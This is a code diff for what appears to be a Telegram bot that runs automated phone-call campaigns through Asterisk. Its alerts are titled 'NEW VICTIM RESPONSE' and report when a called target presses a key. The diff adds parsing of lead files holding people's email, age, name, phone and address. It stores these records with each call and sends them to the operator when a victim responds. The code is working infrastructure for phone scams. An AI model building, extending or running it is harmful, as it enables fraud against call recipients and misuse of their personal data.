@@ -2132,7 +2132,7 @@ async def dtmf_begin_listener(manager, event):
                         campaign_id = call.campaign_id
                         agent_id = call.agent_telegram_id or agent_id
         
-        # DTMFBegin notification removed - we only notify on DTMFEnd when we have the actual digit
+        # DTMFBegin only logs - no notifications sent to avoid duplicates
         logger.info(f"DTMFBegin detected for {target_number} - waiting for DTMFEnd with actual digit")
         
     except Exception as e:
@@ -2287,8 +2287,7 @@ async def dtmf_event_listener(manager, event):
                         campaign_id = call.campaign_id
                         agent_id = call.agent_telegram_id or agent_id
         
-        # Format the notification with tracking ID prominently displayed
-        # Get the tracking ID from the call record if found, otherwise from event or fallback
+        # Format the notification with tracking ID and lead data
         display_tracking_id = "Unknown"
         if call and call.tracking_id:
             display_tracking_id = call.tracking_id
@@ -2297,34 +2296,76 @@ async def dtmf_event_listener(manager, event):
             display_tracking_id = tracking_id
             logger.info(f"Using tracking ID from event: {display_tracking_id}")
         
-        # Send NEW VICTIM RESPONSE notification for ALL calls
+        # Get lead data from call metadata if available
+        lead_data = {}
+        if call and call.call_metadata and call.call_metadata.get('lead_data'):
+            lead_data = call.call_metadata['lead_data']
+        
+        # Build rich notification with lead information
         campaign_display = f"{campaign_id}" if campaign_id else display_tracking_id
         
-        notification = (
-            f"🎯 *NEW VICTIM RESPONSE*\n\n"
-            f"#{campaign_display}\n\n"
-            f"• Target: `{target_number}`\n"
-            f"• CallerID: `{caller_id}`\n"
-            f"• Pressed: `{digit}`\n"
-            f"• Time: {datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')}"
-        )
+        notification = f"🎯 <b>NEW VICTIM RESPONSE</b>\n\n"
+        notification += f"<b>#{campaign_display}</b>\n"
+        notification += f"<b>Pressed:</b> <code>{digit}</code>\n\n"
+        
+        # Add lead information if available
+        if lead_data and not lead_data.get('phone_only'):
+            notification += f"<b>📋 LEAD INFORMATION</b>\n"
+            
+            if lead_data.get('name'):
+                notification += f"<b>👤 Name:</b> {lead_data['name']}\n"
+            
+            if lead_data.get('email'):
+                notification += f"<b>📧 Email:</b> <code>{lead_data['email']}</code>\n"
+            
+            if lead_data.get('age'):
+                notification += f"<b>🎂 Age:</b> {lead_data['age']}\n"
+            
+            notification += f"<b>📱 Phone:</b> <code>{target_number}</code>\n"
+            
+            if lead_data.get('address'):
+                notification += f"<b>🏠 Address:</b> {lead_data['address']}\n"
+        else:
+            # Simple format for phone-only leads
+            notification += f"<b>📱 Phone:</b> <code>{target_number}</code>\n"
+        
+        notification += f"\n<b>⏰ Time:</b> {datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')}"
         
         await application.bot.send_message(
             chat_id=agent_id,
             text=notification,
-            parse_mode='Markdown'
+            parse_mode='HTML'
         )
         
         logger.info(f"Sent NEW VICTIM RESPONSE notification to agent {agent_id}")
         
-        # P1 Campaign Integration: Update campaign state 
+        # P1 Campaign Integration: Update campaign state (only once per DTMF)
         if campaign_id and isinstance(campaign_id, int) and campaign_id in campaign_states:
-            # Update campaign statistics
-            campaign_states[campaign_id].dtmf_responses += 1
-            logger.info(f"Updated campaign {campaign_id} DTMF responses: {campaign_states[campaign_id].dtmf_responses}")
+            # Check if we've already counted this DTMF response for this call
+            dtmf_already_counted = False
+            if call and call.call_metadata:
+                dtmf_already_counted = call.call_metadata.get('dtmf_counted', False)
             
-            # Update campaign message in real-time
-            await update_campaign_message(campaign_id)
+            if not dtmf_already_counted:
+                # Update campaign statistics
+                campaign_states[campaign_id].dtmf_responses += 1
+                logger.info(f"Updated campaign {campaign_id} DTMF responses: {campaign_states[campaign_id].dtmf_responses}")
+                
+                # Mark this DTMF as counted in the call metadata
+                if call:
+                    async with get_async_db_session() as session:
+                        call_to_update = await Call.find_by_call_id(session, call.call_id)
+                        if call_to_update:
+                            call_to_update.call_metadata = {
+                                **(call_to_update.call_metadata or {}),
+                                'dtmf_counted': True
+                            }
+                            await session.commit()
+                
+                # Update campaign message in real-time
+                await update_campaign_message(campaign_id)
+            else:
+                logger.info(f"DTMF response for call {call.call_id} already counted, skipping increment")
         
     except Exception as e:
         logger.error(f"Error processing DTMF event: {e}", exc_info=True)
@@ -3001,7 +3042,7 @@ async def handle_auto_dial_file(update: Update, context: ContextTypes.DEFAULT_TY
         file_content = file_content_bytes.decode('utf-8')
         
         lines = file_content.splitlines()
-        valid_numbers = []
+        valid_leads = []
         invalid_lines = []
         processed_count = 0
         line_limit = 10000 # Limit number of lines to process
@@ -3016,23 +3057,70 @@ async def handle_auto_dial_file(update: Update, context: ContextTypes.DEFAULT_TY
                 continue
 
             processed_count += 1
-            # Simplified normalization focused on E.164
-            normalized = re.sub(r'[^0-9+]', '', original_line) # Remove anything not digit or +
-            if not normalized.startswith('+'):
-                if len(normalized) == 11 and normalized.startswith('1'):
-                    normalized = '+' + normalized # Add + to 1xxxxxxxxxx
-                elif len(normalized) == 10:
-                    normalized = '+1' + normalized # Add +1 to xxxxxxxxxx
-                # Otherwise, if it doesn't start with +, it's invalid for E.164
-                 
-            if validate_phone_number(normalized):
-                valid_numbers.append(normalized)
+            
+            # Parse lead data format: "email | Age: XX | Name | Phone | Address"
+            lead_data = {}
+            phone_number = None
+            
+            if '|' in original_line:
+                # Split by pipe and extract data
+                parts = [part.strip() for part in original_line.split('|')]
+                
+                for part in parts:
+                    # Extract email
+                    if '@' in part and not lead_data.get('email'):
+                        lead_data['email'] = part
+                    
+                    # Extract age
+                    elif part.lower().startswith('age:'):
+                        try:
+                            lead_data['age'] = int(part.split(':')[1].strip())
+                        except:
+                            pass
+                    
+                    # Extract phone number (look for digits)
+                    elif re.search(r'\d{7,}', part):
+                        # Extract just the digits and normalize
+                        digits = re.sub(r'[^0-9]', '', part)
+                        if len(digits) >= 10:
+                            if len(digits) == 10:
+                                phone_number = '+1' + digits
+                            elif len(digits) == 11 and digits.startswith('1'):
+                                phone_number = '+' + digits
+                            elif len(digits) > 11:
+                                # Take the last 10 digits and add +1
+                                phone_number = '+1' + digits[-10:]
+                            break
+                    
+                    # Everything else could be name or address
+                    elif not lead_data.get('name') and not any(char.isdigit() for char in part) and '@' not in part and not part.lower().startswith('age:'):
+                        lead_data['name'] = part
+                    elif not lead_data.get('address') and any(char.isdigit() for char in part):
+                        lead_data['address'] = part
+            else:
+                # Simple phone number format
+                normalized = re.sub(r'[^0-9+]', '', original_line)
+                if not normalized.startswith('+'):
+                    if len(normalized) == 11 and normalized.startswith('1'):
+                        phone_number = '+' + normalized
+                    elif len(normalized) == 10:
+                        phone_number = '+1' + normalized
+                else:
+                    phone_number = normalized
+                
+                # Simple lead data for phone-only format
+                lead_data = {'phone_only': True}
+            
+            # Validate the extracted phone number
+            if phone_number and validate_phone_number(phone_number):
+                lead_data['phone'] = phone_number
+                valid_leads.append(lead_data)
             else:
                 invalid_lines.append((line_num, original_line))
 
-        if not valid_numbers:
+        if not valid_leads:
              await update.message.reply_text(
-                f"❌ Processed {processed_count} lines, but found no valid E.164 phone numbers."
+                f"❌ Processed {processed_count} lines, but found no valid phone numbers."
                 " Please check the file format and try again."
             )
              return AUTO_DIAL
@@ -3062,39 +3150,42 @@ async def handle_auto_dial_file(update: Update, context: ContextTypes.DEFAULT_TY
                 # Use route to determine trunk
                 trunk = f"autodial-{agent.route}" if agent and agent.route else "autodial-one"
                 
-                # Create a call record for each number
+                # Create a call record for each lead
                 timestamp = int(time.time())
-                for idx, number in enumerate(valid_numbers, 1):
+                for idx, lead in enumerate(valid_leads, 1):
+                    phone_number = lead['phone']
                     # Generate a unique tracking ID and call ID
                     tracking_id = f"JKD1.{idx}"
                     microseconds = datetime.now().microsecond
                     call_id = f"campaign_{campaign_id}_{timestamp}_{idx}_{microseconds}"
                     
-                    # Create the call record
+                    # Create the call record with lead data
                     new_call = Call(
                         call_id=call_id,
                         campaign_id=campaign_id,
                         sequence_number=idx,
                         tracking_id=tracking_id,
                         agent_telegram_id=user.id,
-                        target_number=number,
+                        target_number=phone_number,
                         caller_id=caller_id,
                         trunk=trunk,
                         status="queued",  # New status to indicate pre-created record
                         start_time=datetime.now(),
-                        # Store additional metadata as JSON
+                        # Store lead data and metadata as JSON
                         call_metadata={
                             "timestamp": timestamp,
                             "origin": "autodial",
-                            "tracking_id": tracking_id
+                            "tracking_id": tracking_id,
+                            "lead_data": lead  # Store all lead information
                         }
                     )
                     session.add(new_call)
                     pre_created_calls.append({
                         "call_id": call_id,
-                        "target_number": number,
+                        "target_number": phone_number,
                         "sequence_number": idx,
-                        "tracking_id": tracking_id
+                        "tracking_id": tracking_id,
+                        "lead_data": lead
                     })
                 
                 # Commit all call records at once
@@ -3110,12 +3201,12 @@ async def handle_auto_dial_file(update: Update, context: ContextTypes.DEFAULT_TY
             return AUTO_DIAL
         
         # Store the pre-created calls and campaign ID in user_data
-        context.user_data['autodial_numbers'] = valid_numbers
+        context.user_data['autodial_leads'] = valid_leads
         context.user_data['autodial_campaign_id'] = campaign_id
         context.user_data['autodial_pre_created_calls'] = pre_created_calls
 
         response_message = f"✅ Successfully processed file '{document.file_name}'.\n\n"
-        response_message += f"• Found {len(valid_numbers)} valid numbers (out of {processed_count} non-empty lines processed).\n"
+        response_message += f"• Found {len(valid_leads)} valid leads (out of {processed_count} non-empty lines processed).\n"
         if invalid_lines:
             response_message += f"• Found {len(invalid_lines)} invalid/unparseable lines:\n"
             for line_num, line_content in invalid_lines[:5]: 
@@ -3295,7 +3386,7 @@ async def handle_auto_dial(update: Update, context: ContextTypes.DEFAULT_TYPE) -
                 await asyncio.sleep(0.5)  # Half-second delay between batches
         
         # Clear the setup data from user_data
-        context.user_data.pop('autodial_numbers', None)
+        context.user_data.pop('autodial_leads', None)
         context.user_data.pop('autodial_pre_created_calls', None)
         context.user_data.pop('autodial_campaign_id', None)
         
